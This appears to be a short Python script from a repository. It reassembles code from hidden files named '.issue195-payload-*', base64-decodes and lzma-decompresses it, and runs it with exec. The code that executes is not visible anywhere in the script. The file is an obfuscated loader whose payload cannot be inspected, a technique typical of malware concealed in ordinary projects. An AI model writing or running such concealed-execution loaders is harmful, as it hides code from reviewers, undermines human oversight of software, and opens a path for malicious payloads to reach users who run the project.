#!/usr/bin/env python3
from pathlib import Path
import base64
import lzma

ROOT = Path(__file__).resolve().parents[1]
payload = "".join(
    path.read_text(encoding="utf-8")
    for path in sorted((ROOT / "scripts").glob(".issue195-payload-*"))
)
exec(compile(lzma.decompress(base64.b64decode(payload)), __file__, "exec"))
